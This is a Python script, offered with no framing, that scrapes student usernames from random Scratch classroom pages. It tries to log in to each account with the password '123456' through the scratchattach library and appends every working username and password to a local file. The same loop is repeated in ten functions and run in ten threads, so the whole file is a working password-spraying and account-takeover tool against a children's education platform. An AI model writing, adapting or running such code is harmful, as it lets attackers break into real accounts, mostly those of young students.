import requests
from bs4 import BeautifulSoup
import random
import scratchattach as sa
import threading

tryinghard = 0
gotaccounts = 0

def pg1():
    while True:
        username = ""
        tryinghard = 0
        randomid = random.randint(10000, 500000)

        response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/")
        response = BeautifulSoup(response.text, "html.parser")
        if not response.find("li", class_="user thumb item") == None:
            usernames = response.findAll("li", class_="user thumb item")
            randomperson = []
            doittimes = 1
            if len(usernames) > 2:
                for i in range(3):
                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                    while arndomnumberperson in randomperson:
                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                    randomperson.append(arndomnumberperson)
                doittimes = 3
            for i in range(doittimes):
                tryinghard = tryinghard + 1
                try:
                    username = (usernames[int(randomperson[i])].text).replace("\n", "")
                    session = sa.login(username, "123456")
                    print(f"success got an {username} with password 123456")
                    filiing = open("accs.txt", "r")
                    filebefore = filiing.read()
                    filiing = open("accs.txt", "w")
                    filiing.write(filebefore + f"{username}\n123456\n")
                    filiing.close()
                except:
                    imblue = 0
                    print(f"trying get {username} but failed")

def pg2():
    while True:
        username = ""
        tryinghard = 0
        randomid = random.randint(10000, 500000)

        response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/")
        response = BeautifulSoup(response.text, "html.parser")
        if not response.find("li", class_="user thumb item") == None:
            usernames = response.findAll("li", class_="user thumb item")
            randomperson = []
            doittimes = 1
            if len(usernames) > 2:
                for i in range(3):
                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                    while arndomnumberperson in randomperson:
                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                    randomperson.append(arndomnumberperson)
                doittimes = 3
            for i in range(doittimes):
                tryinghard = tryinghard + 1
                try:
                    username = (usernames[int(randomperson[i])].text).replace("\n", "")
                    session = sa.login(username, "123456")
                    print(f"success got an {username} with password 123456")
                    filiing = open("accs.txt", "r")
                    filebefore = filiing.read()
                    filiing = open("accs.txt", "w")
                    filiing.write(filebefore + f"{username}\n123456\n")
                    filiing.close()
                except:
                    imblue = 0
                    print(f"trying get {username} but failed")

def pg3():
    while True:
        username = ""
        tryinghard = 0
        randomid = random.randint(10000, 500000)

        response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/")
        response = BeautifulSoup(response.text, "html.parser")
        if not response.find("li", class_="user thumb item") == None:
            usernames = response.findAll("li", class_="user thumb item")
            randomperson = []
            doittimes = 1
            if len(usernames) > 2:
                for i in range(3):
                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                    while arndomnumberperson in randomperson:
                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                    randomperson.append(arndomnumberperson)
                doittimes = 3
            for i in range(doittimes):
                tryinghard = tryinghard + 1
                try:
                    username = (usernames[int(randomperson[i])].text).replace("\n", "")
                    session = sa.login(username, "123456")
                    print(f"success got an {username} with password 123456")
                    filiing = open("accs.txt", "r")
                    filebefore = filiing.read()
                    filiing = open("accs.txt", "w")
                    filiing.write(filebefore + f"{username}\n123456\n")
                    filiing.close()
                except:
                    imblue = 0
                    print(f"trying get {username} but failed")

def pg4():
    while True:
        username = ""
        tryinghard = 0
        randomid = random.randint(10000, 500000)

        response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/")
        response = BeautifulSoup(response.text, "html.parser")
        if not response.find("li", class_="user thumb item") == None:
            usernames = response.findAll("li", class_="user thumb item")
            randomperson = []
            doittimes = 1
            if len(usernames) > 2:
                for i in range(3):
                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                    while arndomnumberperson in randomperson:
                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                    randomperson.append(arndomnumberperson)
                doittimes = 3
            for i in range(doittimes):
                tryinghard = tryinghard + 1
                try:
                    username = (usernames[int(randomperson[i])].text).replace("\n", "")
                    session = sa.login(username, "123456")
                    print(f"success got an {username} with password 123456")
                    filiing = open("accs.txt", "r")
                    filebefore = filiing.read()
                    filiing = open("accs.txt", "w")
                    filiing.write(filebefore + f"{username}\n123456\n")
                    filiing.close()
                except:
                    imblue = 0
                    print(f"trying get {username} but failed")


def pg5():
    while True:
        username = ""
        tryinghard = 0
        randomid = random.randint(10000, 500000)

        response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/")
        response = BeautifulSoup(response.text, "html.parser")
        if not response.find("li", class_="user thumb item") == None:
            usernames = response.findAll("li", class_="user thumb item")
            randomperson = []
            doittimes = 1
            if len(usernames) > 2:
                for i in range(3):
                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                    while arndomnumberperson in randomperson:
                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                    randomperson.append(arndomnumberperson)
                doittimes = 3
            for i in range(doittimes):
                tryinghard = tryinghard + 1
                try:
                    username = (usernames[int(randomperson[i])].text).replace("\n", "")
                    session = sa.login(username, "123456")
                    print(f"success got an {username} with password 123456")
                    filiing = open("accs.txt", "r")
                    filebefore = filiing.read()
                    filiing = open("accs.txt", "w")
                    filiing.write(filebefore + f"{username}\n123456\n")
                    filiing.close()
                except:
                    imblue = 0
                    print(f"trying get {username} but failed")

def pg6():
    while True:
        username = ""
        tryinghard = 0
        randomid = random.randint(10000, 500000)

        response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/")
        response = BeautifulSoup(response.text, "html.parser")
        if not response.find("li", class_="user thumb item") == None:
            usernames = response.findAll("li", class_="user thumb item")
            randomperson = []
            doittimes = 1
            if len(usernames) > 2:
                for i in range(3):
                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                    while arndomnumberperson in randomperson:
                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                    randomperson.append(arndomnumberperson)
                doittimes = 3
            for i in range(doittimes):
                tryinghard = tryinghard + 1
                try:
                    username = (usernames[int(randomperson[i])].text).replace("\n", "")
                    session = sa.login(username, "123456")
                    print(f"success got an {username} with password 123456")
                    filiing = open("accs.txt", "r")
                    filebefore = filiing.read()
                    filiing = open("accs.txt", "w")
                    filiing.write(filebefore + f"{username}\n123456\n")
                    filiing.close()
                except:
                    imblue = 0
                    print(f"trying get {username} but failed")

def pg7():
    while True:
        username = ""
        tryinghard = 0
        randomid = random.randint(10000, 500000)

        response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/")
        response = BeautifulSoup(response.text, "html.parser")
        if not response.find("li", class_="user thumb item") == None:
            usernames = response.findAll("li", class_="user thumb item")
            randomperson = []
            doittimes = 1
            if len(usernames) > 2:
                for i in range(3):
                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                    while arndomnumberperson in randomperson:
                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                    randomperson.append(arndomnumberperson)
                doittimes = 3
            for i in range(doittimes):
                tryinghard = tryinghard + 1
                try:
                    username = (usernames[int(randomperson[i])].text).replace("\n", "")
                    session = sa.login(username, "123456")
                    print(f"success got an {username} with password 123456")
                    filiing = open("accs.txt", "r")
                    filebefore = filiing.read()
                    filiing = open("accs.txt", "w")
                    filiing.write(filebefore + f"{username}\n123456\n")
                    filiing.close()
                except:
                    imblue = 0
                    print(f"trying get {username} but failed")

def pg8():
    while True:
        username = ""
        tryinghard = 0
        randomid = random.randint(10000, 500000)

        response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/")
        response = BeautifulSoup(response.text, "html.parser")
        if not response.find("li", class_="user thumb item") == None:
            usernames = response.findAll("li", class_="user thumb item")
            randomperson = []
            doittimes = 1
            if len(usernames) > 2:
                for i in range(3):
                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                    while arndomnumberperson in randomperson:
                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                    randomperson.append(arndomnumberperson)
                doittimes = 3
            for i in range(doittimes):
                tryinghard = tryinghard + 1
                try:
                    username = (usernames[int(randomperson[i])].text).replace("\n", "")
                    session = sa.login(username, "123456")
                    print(f"success got an {username} with password 123456")
                    filiing = open("accs.txt", "r")
                    filebefore = filiing.read()
                    filiing = open("accs.txt", "w")
                    filiing.write(filebefore + f"{username}\n123456\n")
                    filiing.close()
                except:
                    imblue = 0
                    print(f"trying get {username} but failed")

def pg9():
    while True:
        username = ""
        tryinghard = 0
        randomid = random.randint(10000, 500000)

        response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/")
        response = BeautifulSoup(response.text, "html.parser")
        if not response.find("li", class_="user thumb item") == None:
            usernames = response.findAll("li", class_="user thumb item")
            randomperson = []
            doittimes = 1
            if len(usernames) > 2:
                for i in range(3):
                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                    while arndomnumberperson in randomperson:
                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                    randomperson.append(arndomnumberperson)
                doittimes = 3
            for i in range(doittimes):
                tryinghard = tryinghard + 1
                try:
                    username = (usernames[int(randomperson[i])].text).replace("\n", "")
                    session = sa.login(username, "123456")
                    print(f"success got an {username} with password 123456")
                    filiing = open("accs.txt", "r")
                    filebefore = filiing.read()
                    filiing = open("accs.txt", "w")
                    filiing.write(filebefore + f"{username}\n123456\n")
                    filiing.close()
                except:
                    imblue = 0
                    print(f"trying get {username} but failed")

def pg10():
    while True:
        username = ""
        tryinghard = 0
        randomid = random.randint(10000, 500000)

        response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/")
        response = BeautifulSoup(response.text, "html.parser")
        if not response.find("li", class_="user thumb item") == None:
            usernames = response.findAll("li", class_="user thumb item")
            randomperson = []
            doittimes = 1
            if len(usernames) > 2:
                for i in range(3):
                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                    while arndomnumberperson in randomperson:
                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                    randomperson.append(arndomnumberperson)
                doittimes = 3
            for i in range(doittimes):
                tryinghard = tryinghard + 1
                try:
                    username = (usernames[int(randomperson[i])].text).replace("\n", "")
                    session = sa.login(username, "123456")
                    print(f"success got an {username} with password 123456")
                    filiing = open("accs.txt", "r")
                    filebefore = filiing.read()
                    filiing = open("accs.txt", "w")
                    filiing.write(filebefore + f"{username}\n123456\n")
                    filiing.close()
                except:
                    imblue = 0
                    print(f"trying get {username} but failed")

threading.Thread(target=pg1).start()
threading.Thread(target=pg2).start()
threading.Thread(target=pg3).start()
threading.Thread(target=pg4).start()
threading.Thread(target=pg5).start()
threading.Thread(target=pg6).start()
threading.Thread(target=pg7).start()
threading.Thread(target=pg8).start()
threading.Thread(target=pg9).start()
threading.Thread(target=pg10).start()